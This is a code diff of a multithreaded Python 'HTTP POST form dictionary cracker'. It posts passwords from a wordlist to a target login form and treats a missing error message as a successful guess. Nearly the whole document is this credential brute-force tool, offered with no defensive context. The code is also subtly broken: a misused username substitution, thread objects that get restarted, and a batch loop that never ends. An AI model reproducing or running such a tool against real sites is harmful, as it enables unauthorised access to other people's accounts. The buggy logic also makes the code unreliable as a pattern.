@@ -1,22 +1,40 @@
 import requests, re, sys, argparse, threading
 from itertools import islice
 
+
 DEFAULT_THREAD_NO = 10
+
+EXIT_SUCCESS = 0
+ERR_FILEOPEN = 100
+
 thread_count = None
 args = None
 
 
+"""
+Parse required and optional program arguments.
+"""
 def parse_arguments():
     global args
-    parser = argparse.ArgumentParser()
+    parser = argparse.ArgumentParser(description="HTTP POST form dictionary cracker")
     parser.add_argument("-u", "--url", type=str, action="store", required=True, help="specify target URL")
     parser.add_argument("-d", "--dict", type=str, action="store", required=True, help="specify dictionary path")
     parser.add_argument("--data", type=str, action="store", required=True, help="specify POST form data")
     parser.add_argument("-m", "--message", type=str, action="store", required=True, help="specify login error message "
                                                                                          "(used to check for a "
                                                                                          "password match)")
+    # TODO: check if this is set in main() and change program logic (i.e., also replace username in 'args.data'
+    #  before replacing the password)
+    parser.add_argument("-l", "--user", type=str, action="store", required=False, help="specify static username to try "
+                                                                                     "on login")
+    # TODO: check if this is set in main() and change program logic completely (i.e., you don't replace password in
+    #  'args.data', you replace the username to be used in the request)
+    parser.add_argument("-L", "--user-list", type=str, action="store", required=False, help="specify username list to "
+                                                                                            "use on login tries")
     parser.add_argument("-t", "--threads", type=int, action="store", required=False, help="specify number of threads "
                                                                                           "to use")
+    parser.add_argument("-v", "--verbose", action="store_true", required=False, help="specify whether to print login "
+                                                                                     "attempts")
     args = parser.parse_args()
 
 
@@ -26,17 +44,22 @@ If the message is not present then a match was found.
 """
 def crack(pURL, pData):
     global args
-
+    if args.verbose:
+        print("[!] Attempting " + str(pData) + "\n")
     r = requests.post(url=pURL, data=pData)
+    # r = requests.get(url=pURL)
     reg = re.search(args.message, r.text)
 
     if reg is None:  # If the login error message is not read
         print("[+] Found possible match: " + str(pData) + "\n")
-        return True
+        exit(EXIT_SUCCESS)
 
-    return False
+    return
 
 
+"""
+Main program logic; Create threads and start them.
+"""
 def main():
     global thread_count, args
     if not args.threads:
@@ -46,23 +69,30 @@ def main():
         thread_count = int(args.threads)
         print("[!] Running with specified thread count [" + str(thread_count) + "] \n")
 
+    semaphore = True
+
     threads = []  # List of threads
-    for i in range(thread_count):  # Create 'thread_count' thread objects with appropriate target function & arguments
-        threads.append(threading.Thread(target=crack, args=args.url))
-
-    # Replace
-
-    # TODO: read through all passwords in the dictionary file in batches of 'thread_count' items
+    # Read through all passwords in the dictionary file in batches of 'thread_count' items
     with open(args.dict, 'r') as infile:
-        # 'passwords' is a generator object, can be used in a loop
-        passwords_batch = islice(infile, thread_count)
-        for i in range(thread_count):
-            threads[i].start()
-        # TODO: make function to craft POST request
-
-    # TODO: try one request with password per thread
-    # TODO: wait for threads to stop (.join())
-    # TODO: process next batch of passwords
+        while semaphore:
+            # 'passwords' is a generator object, can be used in a loop
+            passwords_batch = list(islice(infile, thread_count))
+            batch_length = len(passwords_batch)
+            thread_count = min(batch_length, thread_count)
+            if args.user is not None:  # If --username argument is specified, use that username in the request body
+                re.sub(args.data, "username=.+", "username=" + str(args.user))
+            for i in range(thread_count):
+                # Create 'thread_count' thread objects with appropriate target function & arguments
+                current_data = re.sub("password=.+", "password=" + str(passwords_batch[i]), string=args.data)
+                thread_args = (args.url, current_data)
+                thr = threading.Thread(target=crack, name="thread-" + str(i), args=thread_args)
+                threads.append(thr)
+            for i in range(thread_count):
+                threads[i].start()
+            for i in range(thread_count):
+                threads[i].join()
+            if batch_length < thread_count:
+                semaphore = False
 
 
 if __name__ == '__main__':
